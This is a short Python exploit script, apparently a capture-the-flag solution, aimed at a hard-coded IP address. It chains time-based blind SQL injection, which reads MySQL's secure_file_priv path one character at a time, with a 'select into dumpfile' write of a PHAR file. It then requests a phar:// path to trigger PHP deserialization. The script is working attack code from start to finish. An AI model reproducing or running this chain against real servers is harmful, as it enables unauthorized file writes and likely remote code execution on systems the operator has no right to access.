import requests, string, random, os, time
url = "http://1.14.71.254:28021"
def req(key, value):
    resp = requests.get(url + "/index.php/test", params={'key': key, 'value':value},timeout=1.5)
    return resp
def get_secure_file_priv():
    char_list = "_/" + string.ascii_letters + string.digits
    template = "select if((select substr(@@global.secure_file_priv,%s,1)='%s'),sleep(2),1)"
    data = ''
    print('ok')
    for i in range(1, 100):
        flag = False
        for c in char_list:
            resp = req('3', template % (i, c))
            if resp.elapsed.seconds > 1.5:
                data += c
                flag = True
                print(data)
                break
        if not flag:
            print("end!")
            return data
 
def exp(secure_file_path):
    filename = "".join(random.sample(string.ascii_letters, 6)) + '.phar'
    file = os.path.join(secure_file_path, filename)
# write phar file
    hex_data = open("test.phar", "rb").read().hex()
    command = "select 0x{} into dumpfile '{}'".format(hex_data, file)
    req('3', command)
# check file exists
    command = "select if((ISNULL(load_file('{}'))),sleep(2),1)".format(file)
    if req('3', command).elapsed.seconds > 1.5:
        print("file write fail!")
        exit()
# clean the cache
    req('3',"FLUSH PRIVILEGES")
    time.sleep(2)
# trigger unserialize
    resp = req('35', 'phar://' + file)
    print(resp.text)
if __name__ == '__main__':
        #secure_file_path = get_secure_file_priv()
        #print(secure_file_path)
        secure_file_path = '/tmp/fe9138ae56d639c15418334300269613/'
        exp(secure_file_path)
 
